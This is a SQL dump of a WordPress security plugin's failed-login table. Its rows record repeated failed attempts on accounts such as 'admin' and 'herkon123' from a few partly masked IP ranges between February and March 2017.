INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("820","0","admin","2017-02-08 14:56:17","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("821","0","admin","2017-02-08 15:01:03","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("822","0","admin","2017-02-08 15:01:11","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("823","0","admin","2017-02-08 15:06:07","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("824","0","admin","2017-02-08 15:10:51","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("825","0","admin","2017-02-08 15:11:08","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("826","0","admin","2017-02-08 15:15:24","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("827","0","admin","2017-02-08 15:15:41","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("828","0","admin","2017-02-08 15:20:05","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("829","0","admin","2017-02-08 15:20:21","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("830","0","admin","2017-02-08 15:29:15","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("831","0","admin","2017-02-08 15:33:41","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("832","0","admin","2017-02-08 15:33:59","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("833","0","admin","2017-02-08 15:37:57","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("834","0","admin","2017-02-08 15:38:17","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("835","0","admin","2017-02-08 15:46:05","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("836","0","admin","2017-02-08 15:46:11","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("837","0","admin","2017-02-08 15:49:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("838","0","admin","2017-02-08 15:49:46","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("839","0","admin","2017-02-08 15:53:45","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("840","0","admin","2017-02-08 15:53:47","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("841","0","admin","2017-02-08 15:57:35","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("842","0","admin","2017-02-08 15:57:37","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("843","0","admin","2017-02-08 16:01:16","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("844","0","admin","2017-02-08 16:01:18","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("845","0","admin","2017-02-08 16:05:08","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("846","0","admin","2017-02-08 16:05:14","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("847","0","admin","2017-02-08 16:08:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("848","0","admin","2017-02-08 16:08:53","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("849","0","admin","2017-02-08 16:12:38","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("850","0","admin","2017-02-08 16:20:27","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("851","0","admin","2017-02-08 16:20:32","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("852","0","admin","2017-02-08 16:25:02","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("853","0","admin","2017-02-08 16:25:14","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("854","0","admin","2017-02-08 16:36:06","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("855","0","admin","2017-02-08 16:36:17","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("856","0","admin","2017-02-08 16:41:34","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("857","0","admin","2017-02-08 16:41:39","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("858","0","admin","2017-02-08 16:46:55","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("859","0","admin","2017-02-08 16:47:02","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("860","0","admin","2017-02-08 16:51:58","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("861","0","admin","2017-02-08 16:52:06","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("862","0","admin","2017-02-08 16:57:01","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("863","0","admin","2017-02-08 16:57:04","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("864","0","admin","2017-02-08 17:02:20","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("865","0","admin","2017-02-08 17:02:24","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("866","0","admin","2017-02-08 17:07:50","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("867","0","admin","2017-02-08 17:07:54","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("868","0","admin","2017-02-08 17:12:33","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("869","0","admin","2017-02-08 17:12:35","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("870","0","admin","2017-02-08 17:21:34","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("871","0","admin","2017-02-08 17:21:38","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("872","0","admin","2017-02-08 17:25:54","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("873","0","admin","2017-02-08 17:25:58","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("874","0","admin","2017-02-08 17:29:56","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("875","0","admin","2017-02-08 17:29:58","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("876","0","admin","2017-02-08 17:34:00","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("877","0","admin","2017-02-08 17:34:02","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("878","1","herkon123","2017-02-08 17:40:19","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("879","5","demouser","2017-02-08 17:40:19","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("880","5","demouser","2017-02-08 17:40:23","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("881","1","herkon123","2017-02-08 17:48:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("882","5","demouser","2017-02-08 17:48:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("883","1","herkon123","2017-02-08 17:48:46","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("884","5","demouser","2017-02-08 17:48:46","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("885","5","demouser","2017-02-08 17:58:38","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("886","1","herkon123","2017-02-08 17:58:45","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("887","5","demouser","2017-02-08 17:58:46","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("888","1","herkon123","2017-02-08 17:58:46","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("889","1","herkon123","2017-02-08 18:06:19","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("890","1","herkon123","2017-02-08 18:06:21","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("891","5","demouser","2017-02-08 18:13:56","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("892","1","herkon123","2017-02-08 18:13:57","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("893","1","herkon123","2017-02-08 18:13:58","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("894","1","herkon123","2017-02-08 18:21:23","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("895","5","demouser","2017-02-08 18:21:25","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("896","1","herkon123","2017-02-08 18:21:25","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("897","5","demouser","2017-02-08 18:21:28","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("898","5","demouser","2017-02-08 18:29:03","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("899","1","herkon123","2017-02-08 18:29:03","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("900","5","demouser","2017-02-08 18:29:04","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("901","1","herkon123","2017-02-08 18:29:05","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("902","1","herkon123","2017-02-08 22:04:16","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("903","1","herkon123","2017-02-08 22:04:18","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("904","1","herkon123","2017-02-09 21:22:19","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("905","1","herkon123","2017-02-09 21:22:22","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("906","1","herkon123","2017-02-10 20:46:51","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("907","1","herkon123","2017-02-10 20:46:52","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("908","1","herkon123","2017-02-11 20:07:48","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("909","1","herkon123","2017-02-11 20:07:49","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("910","1","herkon123","2017-02-12 17:22:32","143.208.78.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("911","1","herkon123","2017-02-12 19:34:44","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("912","1","herkon123","2017-02-12 19:34:46","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("913","1","herkon123","2017-02-13 18:59:08","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("914","1","herkon123","2017-02-13 18:59:24","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("915","0","admin","2017-02-14 13:54:46","5.39.222.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("916","1","herkon123","2017-02-14 18:56:20","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("917","1","herkon123","2017-02-14 18:56:25","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("918","1","herkon123","2017-02-15 06:50:09","109.69.4.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("919","1","herkon123","2017-02-15 18:59:49","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("920","1","herkon123","2017-02-15 18:59:57","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("921","1","herkon123","2017-02-16 22:36:21","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("922","1","herkon123","2017-02-16 22:36:25","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("923","1","herkon123","2017-02-18 02:34:51","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("924","1","herkon123","2017-02-18 02:34:58","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("925","1","herkon123","2017-02-18 15:17:05","177.15.9.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("926","1","herkon123","2017-02-19 05:45:55","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("927","1","herkon123","2017-02-19 05:45:56","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("928","1","herkon123","2017-02-20 09:07:01","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("929","1","herkon123","2017-02-20 09:07:03","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("930","1","herkon123","2017-02-21 12:07:30","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("931","1","herkon123","2017-02-21 12:07:31","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("932","1","herkon123","2017-02-22 15:10:39","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("933","1","herkon123","2017-02-22 15:10:45","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("934","0","admin","2017-02-22 15:59:32","185.85.239.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("935","1","herkon123","2017-02-23 18:21:45","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("936","1","herkon123","2017-02-23 18:21:49","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("937","1","herkon123","2017-02-24 21:11:58","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("938","1","herkon123","2017-02-24 21:11:59","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("939","1","herkon123","2017-02-25 20:29:35","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("940","1","herkon123","2017-02-25 20:29:43","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("941","1","herkon123","2017-02-26 16:54:57","61.91.39.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("942","0","bizi","2017-02-26 19:48:51","185.86.5.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("943","1","herkon123","2017-02-26 19:50:25","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("944","1","herkon123","2017-02-26 19:50:27","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("945","1","herkon123","2017-02-27 19:28:37","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("946","1","herkon123","2017-02-27 19:28:53","31.184.194.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("947","1","herkon123","2017-02-28 15:35:18","190.12.21.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("948","1","herkon123","2017-03-02 20:24:51","91.220.131.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("949","1","herkon123","2017-03-02 20:24:57","91.220.131.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("950","1","herkon123","2017-03-03 21:18:10","91.220.131.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("951","1","herkon123","2017-03-03 21:18:13","91.220.131.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("952","1","herkon123","2017-03-10 15:33:56","89.238.132.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("953","1","herkon123","2017-03-10 15:34:01","89.238.132.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("954","1","herkon123","2017-03-10 15:34:03","89.238.132.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("955","1","herkon123","2017-03-10 15:34:04","89.238.132.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("956","1","herkon123","2017-03-10 15:34:06","89.238.132.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("957","1","herkon123","2017-03-10 15:34:08","89.238.132.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("958","1","herkon123","2017-03-10 15:34:10","89.238.132.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("959","1","herkon123","2017-03-11 19:49:47","62.149.192.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("960","1","herkon123","2017-03-11 19:49:50","62.149.192.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("961","1","herkon123","2017-03-11 19:49:53","62.149.192.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("962","1","herkon123","2017-03-11 19:49:57","62.149.192.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("963","1","herkon123","2017-03-11 19:50:00","62.149.192.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("964","1","herkon123","2017-03-11 19:50:03","62.149.192.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("965","1","herkon123","2017-03-11 19:50:06","62.149.192.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("966","1","herkon123","2017-03-13 04:48:46","185.7.215.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("967","1","herkon123","2017-03-13 04:48:59","185.7.215.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("968","1","herkon123","2017-03-13 04:49:04","185.7.215.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("969","1","herkon123","2017-03-13 04:49:10","185.7.215.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("970","1","herkon123","2017-03-13 04:49:23","185.7.215.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("971","0","admin","2017-03-13 19:47:42","185.85.239.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("972","0","admin","2017-03-14 02:28:19","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("973","0","admin","2017-03-14 02:28:22","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("974","0","admin","2017-03-14 02:38:34","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("975","0","admin","2017-03-14 02:38:37","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("976","0","admin","2017-03-14 02:38:42","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("977","0","admin","2017-03-14 02:38:44","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("978","0","admin","2017-03-14 02:51:35","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("979","0","admin","2017-03-14 02:51:38","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("980","0","admin","2017-03-14 03:00:23","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("981","0","admin","2017-03-14 03:00:33","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("982","0","admin","2017-03-14 03:08:12","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("983","0","admin","2017-03-14 03:08:16","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("984","0","admin","2017-03-14 03:17:28","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("985","0","admin","2017-03-14 03:17:30","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("986","0","admin","2017-03-14 03:23:57","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("987","0","admin","2017-03-14 03:24:01","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("988","0","admin","2017-03-14 03:31:05","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("989","0","admin","2017-03-14 03:31:10","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("990","0","admin","2017-03-14 03:38:38","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("991","0","admin","2017-03-14 03:38:40","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("992","0","admin","2017-03-14 03:45:15","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("993","0","admin","2017-03-14 03:45:20","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("994","0","admin","2017-03-14 03:52:53","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("995","0","admin","2017-03-14 03:52:56","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("996","0","admin","2017-03-14 04:00:54","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("997","0","admin","2017-03-14 04:00:56","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("998","0","admin","2017-03-14 04:07:01","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("999","0","admin","2017-03-14 04:07:04","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1000","0","admin","2017-03-14 04:13:08","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1001","0","admin","2017-03-14 04:13:10","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1002","0","admin","2017-03-14 04:21:49","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1003","0","admin","2017-03-14 04:21:59","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1004","0","admin","2017-03-14 04:29:21","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1005","0","admin","2017-03-14 04:29:37","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1006","0","admin","2017-03-14 04:35:50","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1007","0","admin","2017-03-14 04:35:56","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1008","0","admin","2017-03-14 04:42:54","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1009","0","admin","2017-03-14 04:42:56","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1010","0","admin","2017-03-14 04:49:40","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1011","0","admin","2017-03-14 05:06:12","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1012","0","admin","2017-03-14 05:06:14","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1013","0","admin","2017-03-14 05:12:15","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1014","0","admin","2017-03-14 05:18:00","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1015","0","admin","2017-03-14 05:32:55","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1016","0","admin","2017-03-14 05:32:59","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1017","0","admin","2017-03-14 05:39:55","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1018","0","admin","2017-03-14 05:39:57","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1019","0","admin","2017-03-14 05:47:14","91.210.144.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1020","0","admin","2017-03-15 07:39:01","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1021","0","admin","2017-03-15 07:39:02","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1022","0","admin","2017-03-15 07:51:08","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1023","0","admin","2017-03-15 07:51:08","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1024","0","admin","2017-03-15 07:51:10","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1025","0","admin","2017-03-15 07:51:10","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1026","0","admin","2017-03-15 07:59:57","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1027","0","admin","2017-03-15 08:07:15","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1028","0","admin","2017-03-15 08:07:21","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1029","0","admin","2017-03-15 08:12:53","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1030","0","admin","2017-03-15 08:13:00","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1031","0","admin","2017-03-15 08:18:38","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1032","0","admin","2017-03-15 08:18:39","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1033","0","admin","2017-03-15 08:23:56","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1034","0","admin","2017-03-15 08:23:59","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1035","0","admin","2017-03-15 08:32:17","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1036","0","admin","2017-03-15 08:32:19","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1037","0","admin","2017-03-15 08:38:56","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1038","0","admin","2017-03-15 08:38:58","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1039","0","admin","2017-03-15 08:46:20","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1040","0","admin","2017-03-15 08:46:22","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1041","0","admin","2017-03-15 08:53:23","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1042","0","admin","2017-03-15 08:53:25","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1043","0","admin","2017-03-15 09:00:57","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1044","0","admin","2017-03-15 09:00:58","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1045","0","admin","2017-03-15 09:09:09","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1046","0","admin","2017-03-15 09:09:15","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1047","0","admin","2017-03-15 09:24:53","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1048","0","admin","2017-03-15 09:24:54","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1049","0","admin","2017-03-15 09:32:47","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1050","0","admin","2017-03-15 09:32:56","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1051","0","admin","2017-03-15 09:40:05","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1052","0","admin","2017-03-15 09:40:09","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1053","0","admin","2017-03-15 09:46:43","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1054","0","admin","2017-03-15 09:46:48","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1055","0","admin","2017-03-15 09:54:24","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1056","0","admin","2017-03-15 09:54:25","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1057","0","admin","2017-03-15 10:16:03","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1058","0","admin","2017-03-15 10:16:05","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1059","0","admin","2017-03-15 10:21:59","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1060","0","admin","2017-03-15 10:22:01","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1061","0","admin","2017-03-15 10:28:32","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1062","0","admin","2017-03-15 10:28:35","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1063","0","admin","2017-03-15 10:34:22","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1064","0","admin","2017-03-15 10:34:24","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1065","0","admin","2017-03-15 10:41:03","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1066","0","admin","2017-03-15 10:41:05","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1067","0","admin","2017-03-15 10:47:13","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1068","0","admin","2017-03-15 10:47:15","91.210.146.*");
INSERT INTO `cmrfu_aiowps_failed_logins` VALUES("1069","0","admin","2017-03-15 10:53:19","91.210.146.*");
